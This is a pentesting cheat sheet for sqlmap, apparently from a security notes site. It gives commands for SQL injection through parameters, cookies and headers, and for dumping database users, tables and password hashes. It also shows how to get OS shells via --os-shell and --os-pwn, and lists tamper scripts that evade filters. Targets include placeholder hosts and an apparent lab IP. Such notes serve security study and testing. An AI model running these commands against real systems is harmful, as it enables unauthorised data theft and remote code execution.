---
title: sqlmap - A tool for testing SQL injection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting 
---

# sqlmap - A tool for testing SQL injection


## GET parameter

```bash
sqlmap -u ‘http://victim.site/view.php?id=112’ -p id --technique=U
# -p: to indicate an injectable parameter 
# --technique=U  //to indicate a UNION based SQL injection technique // E: error based  // 
# -b: banner of the database
# --tor: to use a proxy to connect to the target URL
# -v3: to see the payloads that sqlmap is using
# --flush-session: to refresh sessions
# --tamper: default tampers are in /usr/share/sqlmap/tamper
```

## POST parameter

```bash
sqlmap -u <URL> --data=<POST string> -p parameter [options]
```


## Using -r file

Capture the request with burpsuite and save it to a file.

```bash
# Get all databases
sqlmap -r nameoffiletoinject --method POST --data "parameter=lala" -p parameter --dbs    

# Get all tables 
sqlmap -r nameoffiletoinject --tables

# Get all columns of a given database dwva
sqlmap -r nameoffiletoinject --current-db dwva -columns

# Get all tables of a given database, for example dwva
sqlmap -r nameoffiletoinject -D dwva --tables

# Get all columns of a given table in a given database
sqlmap -r nameoffiletoinject -D dwva -T users --columns

# Dump users table
sqlmap -r nameoffiletoinject -D dwva -T users --dump

# Get columns username and password of table users from table dwva
sqlmap -r nameoffiletoinject -D dwva -T users -C username,password --dump

# Automatically attempt to upload a web shell using the vulnerable parameter and execute it
sqlmap -r nameoffiletoinject -p vuln-param -os-shell 

# Alternatively use the os-pwn option to gain a shell using meterpreter or vnc 
sqlmap -r nameoffiletoinject -p vuln-param -os-pwn 
```

## Using URL

You can also provide the url with --url or -u

```bash
sqlmap --url ‘http://victim.site’  --dbs --batch //
sqlmap --url ‘http://victim.site’  --users // gets users
sqlmap --url ‘http://victim.site’  --tables // gets all tables
sqlmap --url ‘http://victim.site’  --batch //


# Check what users we have and which privileges that user has.
sqlmap -u $IP/path.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users

# Dump the password hash for an user (postgres in the example) and exploit that super permission.
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" -U postgres --password --batch

# Get a shell 
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" --batch --os-shell                  

```

## Getting a direct SQL Shell

```bash
# Get a OS shell
sqlmap --url ‘http://victim.site’  --os-shell

# GEt a SQL shell
sqlmap --url ‘http://victim.site’  --sql-shell
```

## Suffixes and preffixes

### Set a suffix

```
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### Prefix

```
sqlmap -u "http://example.com/?id=1"  -p id --prefix="') "
```


## Injections in Headers and other HTTP Methods


```
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```


## Tampers

```
sqlmap -r request.txt --tamper=space2comment
# space2comment: changes whitespace to /**/
```



| Tamper                       | Description                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                |
| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart                                                          |
| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload                                                                          |
| base64encode.py              | Base64 all characters in a given payload                                                                                           |
| between.py                   | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| chardoubleencode.py          | Double url-encodes all characters in a given payload (not processing already encoded)                                              |
| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                  |
| charencode.py                | Url-encodes all characters in a given payload (not processing already encoded)                                                     |
| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "%u0022"                           |
| charunicodeescape.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "\u0022"                           |
| equaltolike.py               | Replaces all occurances of operator equal ('=') with operator 'LIKE'                                                               |
| escapequotes.py              | Slash escape quotes (' and ")                                                                                                      |
| greatest.py                  | Replaces greater than operator ('>') with 'GREATEST' counterpart                                                                   |
| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword                                                                                   |
| ifnull2ifisnull.py           | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Embraces complete query with versioned comment                                                                                     |
| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment                                                                                |
| multiplespaces.py            | Adds multiple spaces around SQL keywords                                                                                           |
| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters               |
| percentage.py                | Adds a percentage sign ('%') infront of each character                                                                             |
| overlongutf8.py              | Converts all characters in a given payload (not processing already encoded)                                                        |
| randomcase.py                | Replaces each keyword character with random case value                                                                             |
| randomcomments.py            | Add random comments to SQL keywords                                                                                                |
| securesphere.py              | Appends special crafted string                                                                                                     |
| sp_password.py               | Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs                                           |
| space2comment.py             | Replaces space character (' ') with comments                                                                                       |
| space2dash.py                | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')                        |
| space2hash.py                | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2morehash.py            | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2mssqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mssqlhash.py           | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')                                          |
| space2mysqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mysqldash.py           | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')                                            |
| space2plus.py                | Replaces space character (' ') with plus ('+')                                                                                     |
| space2randomblank.py         | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                                     |
| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                                                                                        |
| unmagicquotes.py             | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)             |
| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT'                                                                     |
| varnish.py                   | Append a HTTP header 'X-originating-IP'                                                                                            |
| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment                                                                    |
| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment                                                                                 |
| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                                                                                        |